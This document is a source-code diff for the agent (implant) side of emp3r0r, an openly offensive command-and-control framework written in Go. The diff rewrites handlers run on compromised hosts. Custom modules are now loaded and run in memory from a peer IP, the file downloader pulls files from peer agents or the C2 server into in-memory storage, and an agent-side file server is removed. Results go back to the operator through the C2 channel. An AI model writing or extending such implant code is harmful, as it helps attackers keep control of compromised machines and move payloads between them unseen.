@@ -1,13 +1,11 @@
 package handler
 
 import (
-	"context"
 	"encoding/base64"
 	"fmt"
 	"os"
 	"path/filepath"
 	"sort"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -16,6 +14,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
@@ -39,58 +38,15 @@ var ActiveListeners sync.Map // map[string]listenerMeta, key: type:port
 func runListDir(cmd *cobra.Command, args []string) {
 	path, _ := cmd.Flags().GetString("path")
 	if path == "" {
-		c2transport.NotifyC2(cmd, "Error: args error\n")
-		return
+		path = "."
 	}
 
-	// Helper to format memory file entries
-	listMemFiles := func() {
-		files := util.ListMemFiles()
-		if len(files) == 0 {
-			c2transport.NotifyC2(cmd, "")
-			return
-		}
-		out := getMemFileCompletions(path, files)
-		c2transport.NotifyC2(cmd, "%s", strings.Join(out, "\n"))
-	}
-
-	// Check for memory path
-	if strings.HasPrefix(path, "mem:") { // match mem:, mem:/, mem://
-		listMemFiles()
-		return
-	}
-
-	var listPath string
-	switch path {
-	case ".":
-		cwd, err := os.Getwd()
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error: %v\n", err)
-			return
-		}
-		listPath = cwd
-	default:
-		absPath, err := filepath.Abs(path)
-		if err != nil {
-			c2transport.NotifyC2(cmd, "Error: %v\n", err)
-			return
-		}
-		listPath = absPath
-	}
-	entries, err := os.ReadDir(listPath)
+	data, err := util.LsPath(path)
 	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: cant read dir %s: %v\n", listPath, err)
+		c2transport.NotifyC2(cmd, "Error listing %s: %v\n", path, err)
 		return
 	}
-	lines := []string{listPath}
-	for _, entry := range entries {
-		if entry.IsDir() {
-			lines = append(lines, fmt.Sprintf("%s/", entry.Name()))
-		} else {
-			lines = append(lines, entry.Name())
-		}
-	}
-	c2transport.NotifyC2(cmd, "%s", strings.Join(lines, "\n"))
+	c2transport.NotifyC2Binary(cmd, data)
 }
 
 // runStat implements !stat --path <path>
@@ -120,7 +76,7 @@ func runStat(cmd *cobra.Command, args []string) {
 	c2transport.NotifyC2Binary(cmd, data)
 }
 
-// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --download_addr <addr>
+// runCustomModule implements !custom_module --mod_name <name> --invocation <base64> --checksum <checksum> --in_mem <bool> --type <payload_type> --file_to_download <file> --peer <ip>
 func runCustomModule(cmd *cobra.Command, args []string) {
 	modName, _ := cmd.Flags().GetString("mod_name")
 	invocationB64, _ := cmd.Flags().GetString("invocation")
@@ -128,7 +84,7 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 	inMem, _ := cmd.Flags().GetBool("in_mem")
 	payloadType, _ := cmd.Flags().GetString("type")
 	fileToDownload, _ := cmd.Flags().GetString("file_to_download")
-	downloadAddr, _ := cmd.Flags().GetString("download_addr")
+	peerIP, _ := cmd.Flags().GetString("peer")
 	if modName == "" || checksum == "" {
 		c2transport.NotifyC2(cmd, "Error: args error\n")
 		return
@@ -140,7 +96,7 @@ func runCustomModule(cmd *cobra.Command, args []string) {
 	}
 	// in_mem is now default and only mode, ignored
 	_ = inMem
-	out := modules.ModuleHandler(downloadAddr, fileToDownload, payloadType, modName, checksum, invocation)
+	out := modules.ModuleHandler(peerIP, fileToDownload, payloadType, modName, checksum, invocation)
 	c2transport.NotifyC2(cmd, "%s\n", out)
 }
 
@@ -372,60 +328,29 @@ func runListener(cmd *cobra.Command, args []string) {
 	}
 }
 
-// runFileServer implements !file_server --port <port> --switch <on/off>
-func runFileServer(cmd *cobra.Command, args []string) {
-	port, _ := cmd.Flags().GetString("port")
-	serverSwitch, _ := cmd.Flags().GetString("switch")
-	portInt, err := strconv.Atoi(port)
-	if err != nil {
-		c2transport.NotifyC2(cmd, "Error parsing port: %v\n", err)
-		return
-	}
-	if serverSwitch == "on" {
-		if c2transport.FileServerCtx != nil {
-			c2transport.FileServerCancel()
-		}
-		c2transport.FileServerCtx, c2transport.FileServerCancel = context.WithCancel(context.Background())
-		go c2transport.FileServer(portInt, c2transport.FileServerCtx, c2transport.FileServerCancel)
-		c2transport.NotifyC2(cmd, "File server on port %s is now %s\n", port, serverSwitch)
-	} else {
-		if c2transport.FileServerCtx != nil {
-			c2transport.FileServerCancel()
-		}
-		c2transport.NotifyC2(cmd, "File server on port %s is now %s\n", port, serverSwitch)
-	}
-}
-
-// runFileDownloader implements !file_downloader --download_addr <url> --path <path> --checksum <checksum>
+// runFileDownloader implements !file_downloader --peer <ip> --path <path> --checksum <checksum>
 func runFileDownloader(cmd *cobra.Command, args []string) {
-	urlStr, _ := cmd.Flags().GetString("download_addr")
-	path, _ := cmd.Flags().GetString("path")
+	peerIP, _ := cmd.Flags().GetString("peer")
+	srcPath, _ := cmd.Flags().GetString("path")
 	checksum, _ := cmd.Flags().GetString("checksum")
-	if urlStr == "" {
-		c2transport.NotifyC2(cmd, "Error: download_addr (url) is required\n")
+	if srcPath == "" {
+		c2transport.NotifyC2(cmd, "Error: path (source file) is required\n")
 		return
 	}
 
-	// Default path to mem:///<filename> if omitted
-	filename := util.FileBaseName(urlStr)
-	if filename == "" {
-		filename = "downloaded_file"
-	}
-	if path == "" {
-		path = fmt.Sprintf("mem:///%s", filename)
-	}
+	// Destination path on downloading agent strictly follows mem:///path/to/file convention
+	cleanSrc := strings.TrimPrefix(srcPath, "mem://")
+	cleanSrc = strings.TrimPrefix(cleanSrc, "/")
+	dstMemPath := fmt.Sprintf("mem:///%s", cleanSrc)
 
-	err := c2transport.FetchFileKCP(urlStr, filename, path, checksum)
+	// FetchFile automatically tries peer download via peerIP if provided, and falls back to C2
+	_, err := c2transport.FetchFile(common.RuntimeConfig, peerIP, srcPath, dstMemPath, checksum)
 	if err != nil {
-		c2transport.NotifyC2(cmd, "Error: %v\n", err)
+		c2transport.NotifyC2(cmd, "Error downloading %s: %v\n", srcPath, err)
 		return
 	}
 
-	if strings.HasPrefix(path, "mem://") {
-		c2transport.NotifyC2(cmd, "File downloaded to %s. Use 'decrypt -p %s' to extract it to disk.\n", path, path)
-	} else {
-		c2transport.NotifyC2(cmd, "File downloaded to %s\n", path)
-	}
+	c2transport.NotifyC2(cmd, "File downloaded to %s. Use 'decrypt -p %s' to extract it to disk.\n", dstMemPath, dstMemPath)
 }
 
 // getMemFileCompletions works as ls completion
